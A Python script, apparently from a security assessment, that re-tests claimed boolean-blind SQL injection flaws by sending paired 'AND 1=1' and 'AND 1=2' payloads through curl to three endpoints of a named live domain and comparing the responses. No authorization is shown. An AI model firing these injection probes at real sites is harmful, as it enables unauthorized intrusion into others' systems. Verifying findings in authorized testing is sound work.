import subprocess, os, urllib.parse
W=os.path.dirname(os.path.abspath(__file__))
ROOT='https://www.infinitycapital.bh'

def curl(url, extra=None, out=None, timeout=25):
    cmd=['curl','-s','--max-time',str(timeout),'-w','\n%{http_code} %{size_download} %{time_total}']
    if out: cmd+=['-o',out]
    if extra: cmd+=extra
    cmd.append(url)
    r=subprocess.run(cmd,capture_output=True,text=True)
    return r.stdout

print("=== Independent re-test of claimed boolean-blind SQLi on /?page= ===")
for label,q in [("true",  "?page=2%20AND%201=1"),
                ("false", "?page=2%20AND%201=2"),
                ("baseline","?page=2"),
                ("true2", "?page=2%27%20AND%20%271%27=%271"),
                ("false2","?page=2%27%20AND%20%271%27=%272")]:
    out=curl(ROOT+q)
    tail=out.strip().split('\n')[-1]
    body=out.strip().rsplit('\n',1)[0]
    print(f'{label:9s} code/size/time = {tail}   bodyhash={hash(body)&0xffffffff}')

print()
print("=== claimed SQLi /api/?id=1 ===")
for label,q in [("true","/api/?id=1%20AND%201=1"),
                ("false","/api/?id=1%20AND%201=2"),
                ("base","/api/?id=1")]:
    out=curl(ROOT+q); tail=out.strip().split('\n')[-1]
    print(f'{label:6s} {tail}')

print()
print("=== claimed SQLi /contact?cb=1 ===")
for label,q in [("true","/contact?cb=1%20AND%201=1"),
                ("false","/contact?cb=1%20AND%201=2"),
                ("base","/contact?cb=1")]:
    out=curl(ROOT+q); tail=out.strip().split('\n')[-1]
    print(f'{label:6s} {tail}')
